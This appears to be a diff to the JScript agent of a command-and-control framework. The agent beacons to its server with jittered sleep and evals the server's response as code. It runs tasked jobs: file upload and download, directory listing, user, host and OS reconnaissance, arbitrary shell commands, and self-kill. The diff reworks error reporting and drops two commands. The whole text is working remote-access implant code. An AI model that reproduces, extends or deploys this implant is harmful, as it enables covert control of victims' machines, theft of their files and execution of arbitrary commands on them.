@@ -38,77 +38,75 @@ function kill(){
 
 while (true) {
   try {
-      eval("batch_request=" + post(batch_response).responseText + ";");
+    eval("batch_request=" + post(batch_response).responseText + ";");
   } catch (e) {
-      batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":b64e("Parse error")}, "id": "' + check_in_job_id + '"}]';
-      WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
-      continue;
+    batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":"' + b64e(e.message) + '"}, "id": "' + check_in_job_id + '"}]';
+    WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
+    continue;
   }
   try {
-      batch_response = '[';
-      for (var job in batch_request) {
-          var id = batch_request[job].id
-          var name = batch_request[job].name
-          var args = batch_request[job].arguments.toString().split(',');
-          try {
-              var results = '';
-              if ('check_in' == name){
-                  check_in_job_id = id;
-                  break;
-              }
-              if ('upload' === name) {
-                  result = '"' + upload(b64d(args[0], "bin"), b64d(args[1])) + '"';
-              }
-              if ('download' === name) {
-                  result = '"' + download(b64d(args[0])) + '"';
-              }
-              if ('dir' === name) {
-                  result = '"' + dir(b64d(args[0])) + '"';
-              }
-              if ('whoami' === name) {
-                  username = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
-                  result = '["' + username + '","' + username + '"]';
-              }
-              if ('tmp' === name) {
-                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%")) + '"';
-              }
-              if ('hostname' === name) {
-                  hostname = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
-                  result = '["' + hostname + '","' + hostname + '"]';
-              }
-              if ('domain' === name) {
-                  result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%")) + '"';
-              }
-              if ('os' === name) {
-                  result = '"' + b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")) + '"';
-              }
-              if ('cmd' === name) {
-                  result = '"' + cmd(b64d(args[0])) + '"';
-              }
-              if ('delfile' === name) {
-                  result = '"' + delfile(b64d(args[0])) + '"';
-              }
-              if ('delay' === name) {
-                  result = '"' + b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%') + '"';
-              }
-              if('set jitter' === name){
-                  jitter = b64d(args[0]);
-                  result = '["' + b64e('Changed jitter to ' + jitter + ' %') + '","' + b64e(jitter) + '"]';
-              }
-              if('set sleep' === name){
-                  sleep = b64d(args[0]);
-                  result = '["' + b64e('Changed sleep to ' + sleep + ' second(s)') + '","' + b64e(sleep) + '"]';
-              }
-              if('kill' === name){
-                kill();
-              }
-              batch_response = batch_response + '{"jsonrpc": "2.0", "result": ' + result  + ',"id":"' + id + '"},';
-          } catch (e) {
-             batch_response = batch_response + '{"jsonrpc": "2.0", "error": {"code":-32602,"message":"' + b64e(e.message) + '"},"id":"' + id + '"},';
-          }
-      }
+    batch_response = '[';
+    for (var job in batch_request) {
+        var id = batch_request[job].id
+        var name = batch_request[job].name
+        var args = batch_request[job].arguments.toString().split(',');
+        try {
+            var result = '';
+            if ('check_in' == name){
+                check_in_job_id = id;
+                continue;
+            }
+            if ('upload' === name) {
+                result = '"' + upload(b64d(args[0], "bin"), b64d(args[1])) + '"';
+            }
+            if ('download' === name) {
+                result = '"' + download(b64d(args[0])) + '"';
+            }
+            if ('dir' === name) {
+                result = '"' + dir(b64d(args[0])) + '"';
+            }
+            if ('whoami' === name) {
+                username = b64e(wscriptshell.ExpandEnvironmentStrings("%USERDOMAIN%") + '\\' + wscriptshell.ExpandEnvironmentStrings("%USERNAME%"));
+                result = '["' + username + '","' + username + '"]';
+            }
+            if ('tmp' === name) {
+                result = '"' + b64e(wscriptshell.ExpandEnvironmentStrings("%TMP%")) + '"';
+            }
+            if ('hostname' === name) {
+                hostname = b64e(wscriptshell.ExpandEnvironmentStrings("%COMPUTERNAME%"));
+                result = '["' + hostname + '","' + hostname + '"]';
+            }
+            if ('os' === name) {
+                result = '"' + b64e(wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\ProductName") + ' ' + wscriptshell.RegRead("HKLM\\\SOFTWARE\\\Microsoft\\\Windows NT\\\CurrentVersion\\\CurrentBuildNumber")) + '"';
+            }
+            if ('cmd' === name) {
+                result = '"' + cmd(b64d(args[0])) + '"';
+            }
+            if ('delay' === name) {
+                result = '"' + b64e('Current sleep is ' + sleep + ' second(s) with a jitter of ' + jitter + '%') + '"';
+            }
+            if('set jitter' === name){
+                jitter = b64d(args[0]);
+                result = '["' + b64e('Changed jitter to ' + jitter + ' %') + '","' + b64e(jitter) + '"]';
+            }
+            if('set sleep' === name){
+                sleep = b64d(args[0]);
+                result = '["' + b64e('Changed sleep to ' + sleep + ' second(s)') + '","' + b64e(sleep) + '"]';
+            }
+            if('kill' === name){
+              kill();
+            }
+            if(result === ''){
+               batch_response = batch_response + '{"jsonrpc": "2.0", "error": {"code":-32601,"message":"' + b64e(name) + '"},"id":"' + id + '"},';
+            } else {
+               batch_response = batch_response + '{"jsonrpc": "2.0", "result": ' + result  + ',"id":"' + id + '"},';
+            }
+        } catch (e) {
+           batch_response = batch_response + '{"jsonrpc": "2.0", "error": {"code":-32600,"message":"' + b64e("Command: " + name + "\n" + "Error Message: " + e.message) + '"},"id":"' + id + '"},';
+        }
+    }
   } catch (e) {
-      // caught for reliability
+     batch_response = '[{"jsonrpc": "2.0", "error": {"code":-32700, "message":"' + b64e("Batch Request: " + batch_request + "\n" + "Error Message: " + e.message) + '"}, "id":"' + check_in_job_id + '"},';
   }
   batch_response = batch_response + '{"jsonrpc": "2.0", "result": "", "id": "' + check_in_job_id + '"}]';
   WScript.Sleep(((sleep - (sleep * (jitter / 100.0))) + Math.random() * ((sleep * (jitter / 100.0)) * 2)) * 1000);
